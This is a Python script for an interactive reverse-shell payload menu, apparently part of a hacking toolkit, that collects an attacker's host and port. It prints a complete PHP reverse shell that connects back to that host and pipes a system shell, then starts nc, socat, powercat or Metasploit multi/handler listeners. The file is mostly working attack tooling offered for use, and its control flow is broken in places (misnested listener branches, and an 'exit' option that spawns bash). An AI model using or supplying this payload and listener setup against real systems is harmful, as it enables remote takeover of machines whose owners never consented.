import os 
import sys 
import time
def attack():
    payload = "[+] <reverseshell/Perl>\n"
def msfvenom():
        print("""
--------------------------------------------
             ___                       
  __ _  ___ / _/  _____ ___  ___  __ _ 
 /  ' \(_-</ _/ |/ / -_) _ \/ _ \/  ' \\
/_/_/_/___/_/ |___/\__/_//_/\___/_/_/_/
                                       

1# Windows/Meterpreter/Staged/Reverse/TCP/x64
2# Windows/Meterpreter/Staged/Reverse/TCP/x32
3# Windows/Meterpreter/Stageless/Reverse/TCP/x64
4# Windows/Meterpreter/Stageless/Reverse/TCP/x32
5# Windows/Staged/Reverse/TCP/x64
6# Windows/Staged/Reverse/TCP/x32
7# Windows/Stageless/Reverse/TCP/x64
8# Windows/Stageless/Reverse/TCP/x32
9# Linux/Meterpreter/Staged/Reverse/TCP/x64
10# Linux/Meterpreter/Staged/Reverse/TCP/x86
11# Linux/Stageless/Reverse/TCP/x64
12# Linux/Stageless/Reverse/TCP/x86
13# Windows/Bind/TCP/ShellCode/BOF
14# macOS/Meterpreter/Staged/Reverse/TCP/x64
15# macOS/Meterpreter/Stageless/Reverse/TCP/x64
16# macOS/Stageless/Reverse/TCP/x64
17# PHP/Meterpreter/Stageless/Reverse/TCP
18# PHP/Reverse/PHP 
19# JSP/Stageless/Reverse/TCP
20# WAR/Stageless/Reverse/TCP
21# Android/Meterpreter/Reverse/TCP
22# Android/Meterpreter/Embed/Reverse/TCP
23# Python/Stageless/Reverse/TCP
24# Bash/Stageless/Reverse/TCP
--------------------------------------------
  """)
def shells():
    print("""
--------------------------------------------
       __       ____  
  ___ / /  ___ / / /__
 (_-</ _ \/ -_) / (_-<
/___/_//_/\__/_/_/___/

1# Shell/sh
2# Shell/bin/sh
3# Shell/bash
4# Shell/bin/bash
5# Shell/cmd
6# Shell/powershell
7# Shell/pwsh
8# Shell/pwsh
9# Shell/ash
10# Shell/bsh
11# Shell/csh
12# Shell/ksh
13# Shell/zsh
14# Shell/pdksh
15# Shell/tcsh
--------------------------------------------
    """)
def options():
    print("""
+==========================================+
               *(options)*

    LHOST = NONE                no

    LPORT = NONE                no

    Listener = NONE             no
+==========================================+
 """)
def options2():
    print(f"""
+==========================================+
               *(options)*

    LHOST = {LHOST}            yes

    LPORT = {LPORT}            yes

    Listener = {Listener}      yes
+==========================================+
 """)
def helpbanner():
    print(f"""
 -------------------------------------
|  help ==> help banner               |                    
|  exit -y ==> exit the exploit       |
|  back ==> to go back to tool        |
|  list ==> to get reversesshells list |
|  set ==> to set the options         |  
|  list2 ==> to show Listenershells   | 
|  start ==> to start the shell       |
 ------------------------------------  
""")
def reverseshell_list():
    print("""
--------------------------------------------
                                       __       ____
  _______ _  _____ _______ ___    ___ / /  ___ / / /
 / __/ -_) |/ / -_) __(_-</ -_)  (_-</ _ \/ -_) / / 
/_/  \__/|___/\__/_/ /___/\__/__/___/_//_/\__/_/_/  
                            /___/                  
1# reverseshell/Perl
2# reverseshell/Perl/no_sh
3# reverseshell/Perl/PentestMonkey
4# reverseshell/PHP/Emoji
5# reverseshell/PHP/PentestMonkey
6# reverseshell/PHP/Ivan/Sincek
7# reverseshell/PHP/cmd
8# reverseshell/PHP/exec
9# reverseshell/PHP/shell_exec
10# reverseshell/PHP/system
11# reverseshell/PHP/passthru
12# reverseshell/PHP `
13# reverseshell/PHP/popen
14# reverseshell/PHP/proc/open
15# reverseshell/Windows/ConPty
16# reverseshell/PowerShell_1
17# revseshell/PowerShell_2
18# revseshell/PowerShell_3
19# revseshell/PowerShell/TLS
20# revseshell/PowerShell/Base64
21# revseshell/Python_1
22# revseshell/Python_2
23# revseshell/Python3_1
24# revseshell/Python3_2
25# revseshell/Python3_Windows
26# revseshell/Python3_shortest
27# revseshell/Ruby_1
28# revseshell/Ruby/no_sh
29# revseshell/socat_1
30# revseshell/socat_2
31# revseshell/node.js
32# revseshell/node.js_2
33# revseshell/Java_1
34# revseshell/Java_2
35# revseshell/Java_3
36# revseshell/Javascript
37# revseshell/Groovy
38# revseshell/telnet
39# revseshell/zsh
40# revseshell/Lua_1
41# revseshell/Lua_2
42# revseshell/Golang
43# revseshell/Vlang
44# revseshell/Awk
45# revseshell/Dart
46# revseshell/Bash -i
47# revseshell/Bash/196
48# revseshell/Bash/read_line
49# revseshell/Bash_5
50# revseshell/Bash_udp
51# revseshell/nc_mkfifo
52# revseshell/nc -e
53# revseshell/nc_exe -e 
54# revseshell/nc -c 
55# revseshell/ncat -e 
56# revseshell/ncat_exe -e 
57# revseshell/ncat_udp
58# revseshell/rustcat
59# revseshell/C
60# revseshell/C/Windows
61# revseshell/C#/TCP/Client
62# revseshell/C#/Bash -i
63# revseshell/Haskell_1
--------------------------------------------
    """)
def Listenershell():
    print("""
--------------------------------------------
   __   _     __                        __       ____  
  / /  (_)__ / /____ ___  ___ ____ ___ / /  ___ / / /__
 / /__/ (_-</ __/ -_) _ \/ -_) __/(_-</ _ \/ -_) / (_-<
/____/_/___/\__/\__/_//_/\__/_/__/___/_//_/\__/_/_/___/
                             /___/                     
1# Listener/nc
2# Listener/ncat
3# Listener/ncat/TLS
4# Listener/rlwrap/nc
5# Listener/socat
6# Listener/socat/TTY
7# Listener/powercat
8# Listener/msfconsole
--------------------------------------------
    """)
exin_commands = ["help","exit","","back","exit -y","list","clear","list2","show options","start","set","shellslist"]
#+
Listener_list = ["Listener/nc","Listener/ncat","Listener/ncat/TLS","Listener/rlwrap/nc","Listener/socat","Listener/socat/TTY","Listener/powercat","Listener/msfconsole"]
#=#+
shell_list = ["sh","/bin/sh","bash","/bin/bash","cmd","powershell","pwsh","ash","bsh","csh","ksh","zsh","pdksh","tcsh"]
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/PHP/Ivan/Sincek\033[1;34m) > \033[1;32m")
        if exin in exin_commands:
                pass
        if exin not in exin_commands:
            print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {exin}")
            pass
        elif exin == "help":
                helpbanner()   
                pass
        elif exin == "exit":
                    print("[+] please type exit -y to go out the tool")
                    pass
        elif exin == "exit -y":
                            print("bye ! ")
                            os.system("""python3 -c 'import pty;pty.spawn("/bin/bash")'""")    
        elif exin == "clear":
                    os.system("clear")    
                    pass
        elif exin == "list": 
                reverseshell_list()
                pass
        elif exin == "list2":
            Listenershell()
            pass
        elif exin == "back":
                os.system("python3 /etc/reverseshells/reverseshell.py")
        elif exin == "show options":
                    options()
                    pass
        elif exin == "shellslist":
            shells()
            pass
        elif exin == "start":
            print("please set first:")
            pass
        elif exin == "set":
            LHOST = input("set your local host: ")
        while LHOST == "":
                        time.sleep(0.5)
                        print("please type LHOST")
                        LHOST = input("set your local host: ")
    #+
        LPORT = input("set your local port: ")
        while LPORT == "":
                        time.sleep(0.5)
                        print("please type LPORT")
                        LPORT = input("set your local port: ")
    #+
        Listener = input("set Listener shell: ")
        while Listener == "":
                        time.sleep(0.5)
                        print("please type Listener shell")
                        Listener = input("set Listener shell: ")
        if Listener not in Listener_list:
                    print("type any of this")
                    time.sleep(1.4)
                    Listenershell()
                    Listener = input("set Listener shell: ")
        if Listener in Listener_list:
                print("done !")
                time.sleep(0.3)
                break
    except:
        attack()
exin2_commands = ["help","exit","","back","exit -y","list","clear","list2","show options","start","reset"]
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/PHP/Ivan/Sincek\033[1;31m)> \033[1;32m")
                    if exin2 not in exin2_commands:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {exin}")
                        pass
                        if exin2 in exin2_commands:
                            pass
                    elif exin2 == "back":
                        os.system("python3 /etc/reverseshells/reverseshell.py")
                    elif exin2 == "show options":
                                    options2()
                                    pass
                    elif exin2 == "list":
                                reverseshell_list()
                                pass
                    elif exin2 == "list2":
                            Listenershell()
                            pass
                    elif exin2 == "exit":
                        print("please type exit -y to get out")
                        pass
                    elif exin2 == "exit -y":
                            print("bye ! ")
                            os.system("""python3 -c 'import pty;pty.spawn("/bin/bash")'""")
                    elif exin2 == "reset":
                        attack()
                    elif exin2 == "clear":
                                os.system("clear")
                                pass
                    elif exin2 == "help":
                            helpbanner()
                            pass
                    elif exin2 == "":
                        pass
                    elif exin2 == "start":
                                break
timer2 = time.strftime("%Y-%m-%d %H:%M:%S")
timer = time.strftime("%H:%M:%S")
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mcheck the shell".format(timer,))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mLHOST ==> {}              yes".format(timer,LHOST))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mLPORT ==> {}              yes".format(timer,LPORT))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mListener ==> {}        yes".format(timer,Listener))
time.sleep(0.5)
print("\033[1m\033[92m[+]-[Shell]\033[0m \033[1;34mthis is your reverseshell with PHP")
time.sleep(1)
print("""
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('LHOST', LPORT);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
""")
if Listener == "Listener/nc":
        time.sleep(0.5)
        print("starting Listener/nc")
        time.sleep(0.2)
        print("happy hacking :>")
        time.sleep(3)
        print("you are now ready")
        print(f"the session was started in ==> [{timer2}]")
        os.system(f"nc -lvnp {LPORT}")
#######################ncat################ ####################
if Listener == "Listener/ncat":
        time.sleep(0.5)
        print("starting Listener/ncat")
        time.sleep(0.2)
        print("happy hacking :>")
        time.sleep(3)
        print("you are now ready")
        print(f"the session was started in ==> [{timer2}]")
        os.system(f"ncat -lvnp {LPORT}")
#######################ncat_TLS################################
if Listener == "Listener/ncat/TLS":
            time.sleep(0.5)
            print("starting Listener/ncat/TLS")
            time.sleep(0.2)
            print("happy hacking :>")
            time.sleep(3)
            print("you are now ready")
            print(f"the session was started in ==> [{timer2}]")
            os.system(f"ncat --ssl -lvnp {LPORT}")
#######################rlwrap_nc###############################
if Listener == "Listener/rlwrap/nc":
                time.sleep(0.5)
                print("starting Listener/rlwrap/nc")
                time.sleep(0.2)
                print("happy hacking :>")
                time.sleep(3)
                print("you are now ready")
                print(f"the session was started in ==> [{timer2}]")
                os.system(f"rlwrap -cAr nc -lvnp {LPORT}")
#######################socat###################################
if Listener == "Listener/socat":
                    time.sleep(0.5)
                    print("starting Listener/socat")
                    time.sleep(0.2)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    os.system(f"socat -d -d TCP-LISTEN:{LPORT} STDOUT")
#######################socat_TTY###############################
if Listener == "Listener/socat/TTY":
                time.sleep(0.5)
                print("starting Listener/socat/TTY")
                time.sleep(0.2)
                print("happy hacking :>")
                time.sleep(3)
                print("you are now ready")
                print(f"the session was started in ==> [{timer2}]")
                os.system(f"socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{LPORT}")
#######################powercat################################
if Listener == "Listener/powercat":
            time.sleep(0.5)
            print("starting Listener/powercat")
            time.sleep(0.2)
            print("happy hacking :>")
            time.sleep(3)
            print("you are now ready")
            print(f"the session was started in ==> [{timer2}]")
            os.system(f"powercat -l -p {LPORT}")
######################msfconsole###############################
msfconsole_commands = ["windows","linux","php","java","android"]
windows_linux = ["x64","x32"]
if Listener == "Listener/msfconsole":
        time.sleep(0.5)
        print("we have some options for this Listener")
        time.sleep(0.5)
        Listener_options = input("can you set here operating system for multi/handler : ")
        while Listener_options not in msfconsole_commands:
                print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options}")
                Listener_options = input("can you set here operating system for multi/handler : ")
                if Listener_options in msfconsole_commands:
                    print("")
        if Listener_options == "linux":
                print("""
                x64
                x32
                """)
                Listener_options2 = input("what is the bit of linux: ")
                while Listener_options2 not in windows_linux:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options2}")
                        Listener_options2 = input("what is the bit of linux: ")
                        if Listener_options2 in windows_linux:
                            print("")  
                if Listener_options2 == "x64":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_lin = "msfconsole -q -x "f"'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_lin)
                if Listener_options2 == "x32":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_lin_2 = "msfconsole -q -x "f"'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_lin_2)
        if Listener_options == "windows":
                print("""
                x64
                x32
                """)
                Listener_options2 = input("what is the bit of windows: ")
                while Listener_options2 not in windows_linux:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options2}")
                        Listener_options2 = input("what is the bit of windows: ")
                        if Listener_options2 in windows_linux:
                            print("")  
                if Listener_options2 == "x64":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_win = "msfconsole -q -x "f"'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_win)
                if Listener_options2 == "x32":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_win_2 = "msfconsole -q -x "f"'use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_win_2)
                if Listener_options == "php":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_php = "msfconsole -q -x "f"'use multi/handler; set payload php/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_php)
                    if Listener_options == "java":
                        time.sleep(0.5)
                        print("okay !")
                        time.sleep(0.5)
                        print("starting Listener/msfconsole")
                        time.sleep(0.3)
                        print("happy hacking :>")
                        time.sleep(3)
                        print("you are now ready")
                        print(f"the session was started in ==> [{timer2}]")
                        msfconsole_java = "msfconsole -q -x "f"'use multi/handler; set payload java/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                        os.system(msfconsole_java)
                        if Listener_options == "android":
                            time.sleep(0.5)
                            print("okay !")
                            time.sleep(0.5)
                            print("starting Listener/msfconsole")
                            time.sleep(0.3)
                            print("happy hacking :>")
                            time.sleep(3)
                            print("you are now ready")
                            print(f"the session was started in ==> [{timer2}]")
                            msfconsole_android = "msfconsole -q -x "f"'use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                            os.system(msfconsole_android)